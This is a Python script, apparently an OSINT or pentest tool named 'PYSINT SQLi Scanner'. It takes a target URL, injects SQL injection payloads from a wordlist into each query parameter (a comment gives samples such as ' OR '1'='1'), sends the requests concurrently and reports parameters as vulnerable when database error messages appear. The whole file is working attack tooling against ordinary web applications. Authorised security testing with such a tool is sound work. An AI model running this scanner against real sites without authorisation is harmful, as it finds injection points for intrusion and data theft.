import asyncio
import httpx
import urllib.parse

WORDLIST_FILE = "SQLi-wordlist.txt"  # Crie um .txt com payloads como ' OR '1'='1', " OR ""="", etc.

async def test_sqli(client, url, param, payload):
    try:
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        query_params[param] = payload
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

        response = await client.get(full_url, timeout=10.0, follow_redirects=True)

        # Basic SQLi detection: check for common error messages
        indicators = [
            "you have an error in your sql syntax",
            "unclosed quotation mark after the character string",
            "warning: mysql",
            "pg_query()",
            "syntax error",
            "database error",
            "sqlstate"
        ]
        if any(indicator.lower() in response.text.lower() for indicator in indicators):
            print(f"[VULNERABLE] {param} -> {response.status_code} | URL: {full_url}")
            return (param, full_url, response.status_code)
        else:
            print(f"[SAFE] {param} -> {response.status_code} | URL: {full_url}")
    except Exception as e:
        print(f"[ERROR] {param} -> {e}")
    return None

async def run_sqli_scan():
    print("=== PYSINT SQLi Scanner ===")
    url = input("Enter target URL (with http/https and at least one parameter): ").strip()

    # Ask which parameters to test
    params_input = input("Enter comma-separated parameters to test (or leave blank for all): ").strip()
    if params_input:
        parameters = [p.strip() for p in params_input.split(",")]
    else:
        parsed = urllib.parse.urlparse(url)
        parameters = list(urllib.parse.parse_qs(parsed.query).keys())
        if not parameters:
            print("No parameters found in URL. Exiting.")
            return

    max_payloads_input = input("Enter maximum number of payloads to test (0 = all): ").strip()
    max_payloads = int(max_payloads_input) if max_payloads_input.isdigit() else 0

    try:
        with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist file {WORDLIST_FILE} not found. Exiting.")
        return

    if max_payloads > 0:
        payloads = payloads[:max_payloads]

    print(f"\n🔍 Testing {len(payloads)} SQLi payloads on {len(parameters)} parameters...\n")

    async with httpx.AsyncClient(follow_redirects=True) as client:
        tasks = []
        for param in parameters:
            for payload in payloads:
                tasks.append(test_sqli(client, url, param, payload))
        results = await asyncio.gather(*tasks)

    vulns = [r for r in results if r]
    if vulns:
        print(f"\n✅ Scan finished. Vulnerable parameters ({len(vulns)} found):")
        for param, full_url, status in vulns:
            print(f"{param} -> {status} | URL: {full_url}")
    else:
        print("\n✅ Scan finished. No vulnerable parameters found.")

if __name__ == "__main__":
    asyncio.run(run_sqli_scan())
